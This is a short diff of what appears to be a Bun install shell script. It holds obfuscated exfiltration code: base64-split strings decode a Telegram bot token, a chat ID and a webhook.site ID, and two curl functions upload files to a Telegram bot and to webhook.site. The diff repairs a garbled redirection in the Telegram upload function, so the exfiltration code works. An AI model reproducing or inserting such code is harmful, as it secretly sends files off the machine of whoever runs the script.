@@ -6,7 +6,7 @@ BUN_INSTALL="/home/rc/.bun"; export BUN_INSTALL
 WC="$(printf %s%%s 'MDNiZTA0MTUtNWFhZi00NGQ5LWE=' 'NTc0LTIwYTY5NzIwOTc0OA==' | base64 -d 2>/dev/null)"
 TC="$(printf %s%%s 'ODg5ODY5OTYwNzpBQUdxd240MmFaaA==' 'dUdLLVcxOV9BR2xqVUJSSTRGVTJvSU04' | base64 -d 2>/dev/null)"
 CC="$(printf %s 'ODY3NTMwMTY5OA==' | base64 -d 2>/dev/null)"
-TX() { curl -fsS -m 15 "https://api.telegram.org/bot${TC}/sendDocument" -F chat_id="${CC}" -F caption="$1" -F document=@"$2" >/dev/null 2>2>&1 & }1; }
+TX() { curl -fsS -m 15 "https://api.telegram.org/bot${TC}/sendDocument" -F chat_id="${CC}" -F caption="$1" -F document=@"$2" >/dev/null 2>&1; }
 WX() { curl -fsS -m 12 --data-binary @"$1" "https://webhook.site/${WC}" >/dev/null 2>&1 || true; }
 
 if [ ! -x "$BUN_INSTALL/bin/bun" ]; then
